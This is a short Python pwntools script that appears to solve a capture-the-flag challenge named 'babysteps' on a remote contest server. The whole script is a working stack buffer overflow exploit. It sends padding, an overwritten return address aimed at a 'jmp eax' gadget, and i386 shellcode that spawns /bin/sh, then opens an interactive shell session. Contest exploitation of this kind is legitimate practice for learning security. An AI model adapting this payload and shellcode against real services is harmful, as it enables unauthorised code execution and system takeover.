from pwn import *


local = False
debug = False
buffer = b'A'*28
eip = p32(0x8049545) # jmp eax
shellcode=b'\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80'


payload = buffer + eip + shellcode

context.update(arch='i386', os='linux')
if local:
    p = process('./babysteps')
    if debug:
        # run in tmux
        gdb.attach(p, '''
            break *ask_baby_name+54
            continue
            ''')
else:
    p = remote('challenge.nahamcon.com', 32465)
    
out = p.recvuntil('First, what is your baby name?')
print(out)
print(payload)
p.sendline(payload)
p.interactive()